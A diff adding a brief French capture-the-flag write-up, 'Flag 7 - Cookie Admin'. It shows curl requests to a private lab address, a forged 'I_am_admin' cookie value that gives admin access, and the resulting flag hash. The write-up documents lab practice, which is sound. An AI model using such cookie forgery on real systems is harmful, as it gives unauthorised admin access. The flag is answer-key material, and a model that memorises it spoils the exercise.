@@ -1,0 +1,28 @@
+Flag 7 - Cookie Admin
+
+On ouvre la page :
+
+http://192.168.1.47/
+
+On recupère le html avec curl :
+
+curl -I http://192.168.1.47
+
+On voit un cookie :
+<img width="1035" height="167" alt="Image" src="https://github.com/user-attachments/assets/27f1e849-95e0-4e25-9f7e-214942aba8b8" />
+
+L'application utilise un cookie non sécurisé pour vérifier si on est admin.
+
+Après plusieurs essais, la valeur admin valide est :
+
+b326b5062b2f0e69046810717534cb09
+
+On envoie un requête avec le cookie admin :
+
+curl -s "http://192.168.1.47/index.php"
+-H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09"
+
+On obtient :
+<img width="1240" height="180" alt="Image" src="https://github.com/user-attachments/assets/fc9d13df-7dad-4f81-889a-f9b582aa445f" />
+
+df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
